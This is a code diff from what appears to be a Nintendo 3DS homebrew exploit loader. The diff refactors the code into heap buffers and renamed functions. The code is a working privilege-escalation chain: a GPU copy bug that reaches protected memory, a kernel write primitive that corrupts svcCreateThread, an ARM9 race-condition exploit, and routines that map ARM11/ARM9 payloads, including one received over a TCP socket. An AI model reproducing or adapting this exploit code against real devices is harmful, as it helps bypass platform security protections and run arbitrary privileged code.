@@ -12,22 +12,24 @@
 #include "exploitdata.h"
 
 
-// some ugly global vars
-struct exploit_data g_expdata;
-struct arm11_shared_data g_arm11shared;
+/* should be the very first call. allocates heap buffer
+   for ARM9 payload */ 
+u32 brahma_init (void) {
+	g_ext_arm9_buf = memalign(0x1000, ARM9_PAYLOAD_MAX_SIZE);
+	return (g_ext_arm9_buf != 0);	
+}
 
-/* TODO: replace with heap buffers and
-   properly limit maximum size of payload
-   so we won't write beyond FCRAM */
-u8  g_ext_arm9_buf[ARM9_PAYLOAD_MAX_SIZE];
-u32 g_ext_arm9_size = 0;
-s32 g_ext_arm9_loaded = 0;
-u8  g_is_healed_svc_handler = 0;
-s32 g_do_patch_svc = 0;
+/* call upon exit */
+u32 brahma_exit (void) {
+	if (g_ext_arm9_buf) {
+		free(g_ext_arm9_buf);
+	}
+	return 1;	
+}
 
 /* overwrites two instructions (8 bytes in total) at src_addr
    with code that redirects execution to dst_addr */ 
-void redirect_codeflow(u32 *dst_addr, u32 *src_addr) {
+void redirect_codeflow (u32 *dst_addr, u32 *src_addr) {
 	*(src_addr + 1) = dst_addr;
 	*src_addr = ARM_JUMPOUT;	
 }
@@ -35,9 +37,9 @@ void redirect_codeflow(u32 *dst_addr, u32 *src_addr) {
 /* exploits a bug that causes the GPU to copy memory
    that otherwise would be inaccessible to code from
    non-privileged code */
-int do_gshax_copy(void *dst, void *src, unsigned int len) {
-	unsigned int check_mem = linearMemAlign(0x10000, 0x40);
-	int i = 0;
+void do_gshax_copy (void *dst, void *src, u32 len) {
+	u32 check_mem = linearMemAlign(0x10000, 0x40);
+	s32 i = 0;
 
 	for (i = 0; i < 16; ++i) {
 		GSPGPU_FlushDataCache (NULL, src, len);
@@ -47,27 +49,27 @@ int do_gshax_copy(void *dst, void *src, unsigned int len) {
 	}
 	HB_FlushInvalidateCache();
 	linearFree(check_mem);
-	return 0;
+	return;
 }
 
 /* fills exploit_data structure with information that is specific
    to 3DS model and firmware version
-   
+
    returns: 0 on failure, 1 on success */ 
-int get_exploit_data(struct exploit_data *data) {
+s32 get_exploit_data (struct exploit_data *data) {
 	u32 fversion = 0;    
 	u8  isN3DS = 0;
 	s32 i;
 	s32 result = 0;
 	u32 sysmodel = SYS_MODEL_NONE;
-	
+
 	if(!data)
 		return result;
-	
+
 	fversion = osGetFirmVersion();
 	APT_CheckNew3DS(NULL, &isN3DS);
 	sysmodel = isN3DS ? SYS_MODEL_NEW_3DS : SYS_MODEL_OLD_3DS;
-	
+
 	/* attempt to find out whether the exploit supports 'our'
 	   current 3DS model and FIRM version */
 	for(i=0; i < sizeof(supported_systems)/sizeof(supported_systems[0]); i++) {
@@ -83,7 +85,7 @@ int get_exploit_data(struct exploit_data *data) {
 
 /* exploits a bug which causes the ARM11 kernel
    to write a certain value to 'address' */
-void priv_write_four(u32 address) {
+void priv_write_four (u32 address) {
 	const u32 size_heap_cblk = 8 * sizeof(u32);
 	u32 addr_lin, addr_lin_o;
 	u32 dummy;
@@ -108,57 +110,54 @@ void priv_write_four(u32 address) {
 	
 	// Trigger write to 'address' 
 	svcControlMemory(&dummy, addr_lin, 0, 0x1000, MEMOP_FREE, 0);
-   
+
 	// restore heap
 	do_gshax_copy(addr_lin, saved_heap, size_heap_cblk);
 
 	linearFree(saved_heap);
 	linearFree(cstm_heap);
-	
 	return;	
 }
 
 // trick to clear icache
-void user_clear_icache() {
-	int i, result = 0;
-	int (*nop_func)(void);
-	const int size_nopslide = 0x1000;	
-	u32 nop_slide[size_nopslide] __attribute__((aligned(0x1000)));		
-
-	HB_ReprotectMemory(nop_slide, 4, 7, &result);
-
-	for (i = 0; i < size_nopslide / sizeof(u32); i++) {
-		nop_slide[i] = ARM_NOP;
-	}
-	nop_slide[i-1] = ARM_RET;
-	nop_func = nop_slide;
-	HB_FlushInvalidateCache();
+void user_clear_icache (void) {
+	s32 i, result = 0;
+	s32 (*nop_func)(void);
+	const u32 size_nopslide = 0x1000;	
+	u32 *nop_slide = memalign(0x1000, size_nopslide);
 	
-	nop_func();
+	if (nop_slide) { 			
+		HB_ReprotectMemory(nop_slide, 4, 7, &result);
+		for (i = 0; i < size_nopslide / sizeof(u32); i++) {
+			nop_slide[i] = ARM_NOP;
+		}
+		nop_slide[i-1] = ARM_RET;
+		nop_func = nop_slide;
+		HB_FlushInvalidateCache();
+	
+		nop_func();
+		free(nop_slide);
+	}
 	return;
 }
 
 /* Corrupts ARM11 kernel code (CreateThread()) in order to
-   open a door for ARM11 code execution with kernel privileges. */
-int corrupt_arm11_kernel_code(void) {
-	int i;
-	int (*nop_func)(void);
-	int *ipc_buf;
-	int result = 0;
-	
+   open a door for code execution with ARM11 SVC privileges. */
+s32 corrupt_svcCreateThread (void) {
+	s32 result = 0;
+
 	// get system dependent data required for the exploit		
 	if (get_exploit_data(&g_expdata)) {
 		
 		/* prepare system-dependant data required by
-		the exploit's ARM11 kernel code */
-		
+		the exploit's ARM11 kernel code */		
 		g_arm11shared.va_hook1_ret = g_expdata.va_hook1_ret;
 		g_arm11shared.va_pdn_regs = g_expdata.va_pdn_regs;
 		g_arm11shared.va_pxi_regs = g_expdata.va_pxi_regs;
-	
+
 		// corrupt certain parts of the svcCreateThread() kernel code
 		priv_write_four(g_expdata.va_patch_createthread);
-	
+
 		// clear icache from "userland"
 		user_clear_icache();
 		result = 1;		
@@ -168,15 +167,18 @@ int corrupt_arm11_kernel_code(void) {
 }
 
 /* TODO: experimental, network code might be moved somewhere else */
-int recv_arm9_payload() {
-	int sockfd;
+s32 recv_arm9_payload (void) {
+	s32 sockfd;
 	struct sockaddr_in sa;
-	int ret;
+	s32 ret;
 	u32 kDown, old_kDown;
+	s32 clientfd;
+	struct sockaddr_in client_addr;
+	s32 addrlen = sizeof(client_addr);
 		
 	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
 		printf("[!] Error: socket()\n");
-		return 1;
+		return 0;
 	}
 
 	bzero(&sa, sizeof(sa));
@@ -187,20 +189,19 @@ int recv_arm9_payload() {
     if (bind(sockfd, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
 		printf("[!] Error: bind()\n");
 		close(sockfd);
-		return 1;
+		return 0;
 	}
 
 	if (listen(sockfd, 1) != 0) {
 		printf("[!] Error: listen()\n");
 		close(sockfd);
-		return 1;
+		return 0;
 	}
 
 	printf("[x] IP %s:%d\n", inet_ntoa(sa.sin_addr), BRAHMA_NETWORK_PORT);
 
-	int clientfd;
-	struct sockaddr_in client_addr;
-	int addrlen = sizeof(client_addr);
+	g_ext_arm9_size = 0;
+	g_ext_arm9_loaded = 0;
 
 	fcntl(sockfd, F_SETFL, O_NONBLOCK);
 
@@ -212,7 +213,7 @@ int recv_arm9_payload() {
 		if (kDown != old_kDown) {
 			printf("[!] Aborted\n");
 			close(sockfd);
-			return 1;
+			return 0;
 		}
 
 		clientfd = accept(sockfd, (struct sockaddr*)&client_addr, &addrlen);
@@ -224,21 +225,23 @@ int recv_arm9_payload() {
 	printf("[x] Connection from %s:%d\n\n", inet_ntoa(client_addr.sin_addr),
 		ntohs(client_addr.sin_port));
 
-	g_ext_arm9_size = 0;
-	g_ext_arm9_loaded = 0;
-	
-	int recvd;
-	int total = 0;
-	int remsize = ARM9_PAYLOAD_MAX_SIZE;
-	u8 *dst = &g_ext_arm9_buf;
-	while ((recvd = recv(clientfd, dst + total, remsize - total, 0)) != 0) {
+	s32 recvd;
+	u32 total = 0;
+	s32 overflow = 0;
+	while ((recvd = recv(clientfd, g_ext_arm9_buf + total,
+	                     ARM9_PAYLOAD_MAX_SIZE - total, 0)) != 0) {
 		if (recvd != -1) {
 			total += recvd;
 			printf(".");
-			g_ext_arm9_size += recvd;
+		}
+		if (total >= ARM9_PAYLOAD_MAX_SIZE) {
+			overflow = 1;
+			printf("[!] Error: invalid payload size\n");
+			break;
 		}
 	}
 	printf("\n\n[x] Received %d bytes in total\n", total);
+	g_ext_arm9_size = overflow ? 0 : total;
 	g_ext_arm9_loaded = (g_ext_arm9_size != 0);
 
 	close(clientfd);
@@ -254,13 +257,13 @@ int recv_arm9_payload() {
    out_size - will contain the payload's actual size
 
    returns: 0 on failure, 1 on success */
-int load_arm9_payload(char *filename) {
-	int result = 0;
+s32 load_arm9_payload (char *filename) {
+	s32 result = 0;
 	s32 fsize = 0;
-	
+
 	if (!filename)
 		return result; 
-	
+
 	FILE *f = fopen(filename, "rb");
 	if (f) {
 		fseek(f , 0, SEEK_END);
@@ -268,7 +271,7 @@ int load_arm9_payload(char *filename) {
 		g_ext_arm9_size = fsize;
 		rewind(f);
 		if (fsize >= 8 && (fsize < ARM9_PAYLOAD_MAX_SIZE)) {
-				u32 bytes_read = fread(&g_ext_arm9_buf, 1, fsize, f);
+				u32 bytes_read = fread(g_ext_arm9_buf, 1, fsize, f);
 				result = (g_ext_arm9_loaded = (bytes_read == fsize));
 		}
 		fclose(f);
@@ -277,25 +280,24 @@ int load_arm9_payload(char *filename) {
 }
 
 /* copies externally loaded ARM9 payload to FCRAM
-   - Please note that the ARM11 payload copies
-     the original ARM9 entry point from the mapped
-	 FIRM header to offset 4 of the ARM9 payload.
-	 Thus, the ARM9 payload should consist of
-	 - a branch instruction at offset 0 and
-	 - a placeholder (u32) at offset 4 (=ARM9 entrypoint) */ 
-int map_arm9_payload(void) {
-
+   - During execution of the ARM11 payload, its code writes
+     a copy of the mapped FIRM header's ARM9 entry point to
+     offset 4 of the ARM9 payload, so that custom ARM9 payload
+     may return execution to FIRM.
+     Thus, the ARM9 payload should consist of
+     - a branch instruction at offset 0 and
+     - a placeholder (u32) at offset 4 (=ARM9 entrypoint) */ 
+s32 map_arm9_payload (void) {
 	extern void *arm9_start;
 	extern void *arm9_end;
-
 	void *src;
 	volatile void *dst;
-	
+
 	s32 size = 0;
 	s32 result = 0;
 
 	dst = (void *)(g_expdata.va_fcram_base + OFFS_FCRAM_ARM9_PAYLOAD);
-	
+
 	if (!g_ext_arm9_loaded) {
 		// defaul ARM9 payload
 		src = &arm9_start;
@@ -303,10 +305,10 @@ int map_arm9_payload(void) {
 	}
 	else {
 		// external ARM9 payload
-		src = &g_ext_arm9_buf;
+		src = g_ext_arm9_buf;
 		size = g_ext_arm9_size;
 	}
-	
+
 	// TODO: properly sanitize 'size' (must not overflow fcram)
 	if (size >= 0 && size <= ARM9_PAYLOAD_MAX_SIZE) {
 		memcpy(dst, src, size);
@@ -316,22 +318,20 @@ int map_arm9_payload(void) {
 	return result;
 }
 
-int map_arm11_payload(void) {
-
+s32 map_arm11_payload (void) {
 	extern void *arm11_start;
 	extern void *arm11_end;
-	
 	void *src;
 	volatile void *dst;
 	s32 size = 0;
 	u32 offs;
-	int result_a = 0;
-	int result_b = 0;
+	s32 result_a = 0;
+	s32 result_b = 0;
 
 	src = &arm11_start;
 	dst = (void *)(g_expdata.va_exc_handler_base_W + OFFS_EXC_HANDLER_UNUSED);
 	size = (u8 *)&arm11_end - (u8 *)&arm11_start;
-	
+
 	// TODO: sanitize 'size' 
 	if (size) {
 		memcpy(dst, src, size);
@@ -351,12 +351,12 @@ int map_arm11_payload(void) {
 		result_b = 1;
 	}
 
-	return result_a & result_b;
+	return result_a && result_b;
 }
 
-void exploit_arm9_race_condition() {
+void exploit_arm9_race_condition (void) {
 
-	int (* const _KernelSetState)(int, int, int, int) =
+	s32 (* const _KernelSetState)(u32, u32, u32, u32) =
 	    (void *)g_expdata.va_kernelsetstate;
 	
 	asm volatile ("clrex");
@@ -387,60 +387,44 @@ void exploit_arm9_race_condition() {
 	return;
 }
 
-/* - restores corrupted code of CreateThread() syscall
-   - if heal_svc_handler is true, a patch to the ARM11
-     Kernel's syscall handler is applied in order to
-     remove a certain restriction. This is not really
-	 required since we're going to acquire ARM9 svc
-	 privileges.*/
-void apply_patches (bool heal_svc_handler) {
+/* - restores corrupted code of CreateThread() syscall */
+void repair_svcCreateThread (void) {
 	asm volatile ("clrex");
 	
 	CleanEntireDataCache();
 	InvalidateEntireInstructionCache();	
 
 	// repair CreateThread()
-	*(int *)(g_expdata.va_patch_createthread) = 0x8DD00CE5;
+	*(u32 *)(g_expdata.va_patch_createthread) = 0x8DD00CE5;
 			
-	// heal svc handler (patch it to allow access to restricted SVCs) 
-	if(heal_svc_handler && g_expdata.va_patch_svc_handler > 0) {
-		*(int *)(g_expdata.va_patch_svc_handler) = ARM_NOP;
-		*(int *)(g_expdata.va_patch_svc_handler+8) = ARM_NOP;
-		g_is_healed_svc_handler = 1;
-	}
-
 	CleanEntireDataCache();
 	InvalidateEntireInstructionCache();	
 
-	return 0;
+	return;
 }
 
-int __attribute__((naked))
-launch_privileged_code (void) {
+/* restore svcCreateThread code (just to be safe),
+   prepare for and perform firm launch */
+s32 __attribute__((naked))
+priv_firm_reboot (void) {
 	asm volatile ("add sp, sp, #8\t\n");
 	
-	// repair CreateThread() but don't patch SVC handler
-	apply_patches(g_do_patch_svc);
-	// acquire ARM9 code execution privileges
+	repair_svcCreateThread();
 	exploit_arm9_race_condition();
 	
 	asm volatile ("movs r0, #0\t\n"
 			 "ldr pc, [sp], #4\t\n");
 }
 
-int run_exploit(int svc_patch) {
-
-	int fail_stage = 0;
-	g_do_patch_svc = svc_patch;
-	//user_clear_icache();
-
+s32 firm_reboot (void) {
+	s32 fail_stage = 0;
 	/* 3DS and/or firmware not supported, ARM11 exploit failure */
 	fail_stage++;
 	
-	if(corrupt_arm11_kernel_code ()) {
+	if (corrupt_svcCreateThread()) {
 		/* Firmlaunch failure, ARM9 exploit failure*/
 		fail_stage++;
-		svcCorruptedCreateThread(launch_privileged_code);
+		svcCorruptedCreateThread(priv_firm_reboot);
 	}
 
 	/* we do not intend to return ... */
